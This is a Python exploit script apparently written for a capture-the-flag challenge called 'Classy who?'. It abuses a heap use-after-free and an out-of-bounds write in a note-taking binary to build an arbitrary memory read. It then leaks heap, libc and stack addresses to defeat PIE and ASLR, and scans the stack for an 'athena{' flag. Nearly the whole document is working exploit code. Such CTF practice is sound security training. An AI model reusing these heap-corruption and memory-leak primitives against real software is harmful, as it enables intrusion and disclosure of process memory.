#!/usr/bin/env python3
# Classy who? — heap UAF + OOB write => arbitrary read => leak libc => leak stack (environ)
# => scan stack for flag (local_flag in main). glibc, PIE, ASLR. Fully offset-independent.
import importlib.util
spec=importlib.util.spec_from_file_location("pwnmod","pwn.py"); m=importlib.util.module_from_spec(spec); spec.loader.exec_module(m)
T,p64,u64=m.T,m.p64,m.u64

t=T()
for i in range(8): t.C(i,0x18)
for i in range(8): t.W(i,0,bytes([0x41+i])*8)

# --- heap leak via over-read: note[i].data +0x20 = note[i+1].struct{data,size} ---
t.W(0,0x28,p64(0x400))
d=t.R(1)[:0x400]
d1=u64(d[0x20:0x28])-0x40
heapbase=d1&~0xfff

# --- arbitrary read: overwrite note1 struct via overflow of note0 data ---
def arb(addr,size=0x100):
    t.W(0,0x20,p64(addr)+p64(size)); return t.R(1)[:size]
assert arb(d1,0x8)==b'BBBBBBBB', "arb read broken"
print(f"[+] heap leak d1=0x{d1:012x}")

# --- libc leak: free a big chunk -> unsorted bin fd/bk = main_arena; scan heap for 0x7f ptr ---
t.C(10,0x500); t.C(11,0x18); t.D(10)
libc_ptr=None
for base in range(heapbase, heapbase+0x2000, 0x400):
    win=arb(base,0x400)
    for o in range(0,len(win)-8,8):
        v=u64(win[o:o+8])
        if 0x7f0000000000<=v<0x7fffffffffff: libc_ptr=v; break
    if libc_ptr: break
print(f"[+] libc ptr (main_arena) = 0x{libc_ptr:012x}")

# --- stack leak: scan libc data around leak for stack-range pointer (environ) ---
lp=libc_ptr&~0xfff; stack_ptr=None
for base in range(lp-0x1000, lp+0x1000, 0x400):
    win=arb(base,0x400)
    for o in range(0,len(win)-8,8):
        v=u64(win[o:o+8])
        if 0x7ffc00000000<=v<=0x7fffffffffff: stack_ptr=v; break
    if stack_ptr: break
print(f"[+] stack ptr (environ) = 0x{stack_ptr:012x}")

# --- scan stack for flag ---
flag=None
start=(stack_ptr&~0xfff)+0x1000
for base in range(start, start-0x6000, -0x200):
    try: win=arb(base,0x400)
    except Exception as e:
        print("stop scan @",hex(base),e); break
    if b'athena{' in win:
        i=win.find(b'athena{'); flag=win[i:win.find(b'}',i)+1]
        print(f"[+] found flag @ 0x{base+i:012x}")
        break
print("\n[FLAG]", flag.decode() if flag else "NOT FOUND")
